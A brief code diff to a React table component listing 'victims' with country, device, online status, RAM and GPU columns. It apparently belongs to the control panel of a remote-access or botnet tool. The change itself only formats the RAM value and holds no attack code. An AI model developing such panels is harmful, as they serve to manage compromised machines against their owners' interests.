@@ -7,6 +7,7 @@ import type { Victim } from "../../api/victims";
 import { victimsColumnSizeClass, type VictimsColumnKey } from "./victims-columns";
 import { countryCodeToFlagEmoji } from "../utils/country-flag";
 import { getVictimDeviceIconSrc } from "../utils/victim-device-icon";
+import { formatRam } from "../utils/format-ram";
 
 import { formatTime, getLastActiveMs, isVictimOnline } from "../utils/victim-status";
 
@@ -128,7 +129,7 @@ function VictimRowInner(props: InnerProps) {
          case "h-ram":
             return (
                <td key={col} className={cn(col, victimsColumnSizeClass(col), cellBase)}>
-                  {v.ram ?? ""}
+                  {formatRam(v.ram)}
                </td>
             );
          case "h-gpu":
